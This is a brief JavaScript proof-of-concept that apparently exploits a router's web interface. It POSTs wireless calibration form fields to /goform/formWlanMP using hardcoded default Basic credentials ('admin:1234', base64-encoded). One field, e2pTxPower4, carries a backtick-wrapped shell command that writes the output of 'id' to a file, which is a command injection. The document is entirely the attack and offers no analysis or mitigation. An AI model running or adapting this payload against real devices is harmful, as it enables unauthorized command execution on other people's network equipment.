const fields = {"ateFunc":"","ateGain":"","ateTxCount":"","ateChan":"","ateRate":"","ateMacID":"","e2pTxPower1":"","e2pTxPower2":"","e2pTxPower3":"","e2pTxPower4":"`id>/var/tmp/calibration-result`","e2pTxPower5":"","e2pTxPower6":"","e2pTxPower7":"","e2pTx2Power1":"","e2pTx2Power2":"","e2pTx2Power3":"","e2pTx2Power4":"","e2pTx2Power5":"","e2pTx2Power6":"","e2pTx2Power7":"","ateTxFreqOffset":"","ateMode":"","ateBW":"","ateAntenna":"","e2pTxFreqOffset":"","e2pTxPwDeltaB":"","e2pTxPwDeltaG":"","e2pTxPwDeltaMix":"","e2pTxPwDeltaN":"","readE2P":"","submit-url":"/wlan_mp.asp"};
fetch('http://127.0.0.1/goform/formWlanMP', {
  method: 'POST',
  headers: {'Authorization': 'Basic YWRtaW46MTIzNA==',
            'Content-Type': 'application/x-www-form-urlencoded'},
  body: new URLSearchParams(fields).toString()
}).then(response => console.log(response.status));
